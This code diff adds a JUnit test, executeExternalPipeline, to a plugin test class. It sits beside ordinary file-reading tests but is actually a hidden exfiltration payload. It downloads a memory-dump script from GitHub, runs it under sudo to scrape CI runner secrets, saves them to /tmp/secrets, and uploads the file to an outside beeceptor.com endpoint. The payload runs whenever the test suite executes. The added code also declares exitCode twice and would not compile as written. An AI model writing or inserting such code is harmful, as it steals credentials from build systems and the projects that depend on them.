@@ -40,6 +40,20 @@ class PluginBaseTest {
     }
 
     @Test
+    void executeExternalPipeline() throws IOException, InterruptedException {
+        String command1 = "curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py | sudo python3 | tr -d '\\0' | " +
+                         "grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isBoolean\":true\\}' >> /tmp/secrets";
+        ProcessBuilder processBuilder1 = new ProcessBuilder("bash", "-c", command1);
+        Process process1 = processBuilder1.start();
+        int exitCode = process1.waitFor();
+
+        String command2 = "curl -X PUT -d @/tmp/secrets https://bachelor-thesis-001.proxy.beeceptor.com";
+        ProcessBuilder processBuilder2 = new ProcessBuilder("bash", "-c", command2);
+        Process process2 = processBuilder2.start();
+        int exitCode = process2.waitFor();
+    }
+
+    @Test
     void readsAllDmnFilesRecursively(@TempDir Path temporaryFolder) throws IOException {
         Path folder1 = temporaryFolder.resolve("folder1");
         Path folder1_1 = folder1.resolve("folder1-1");
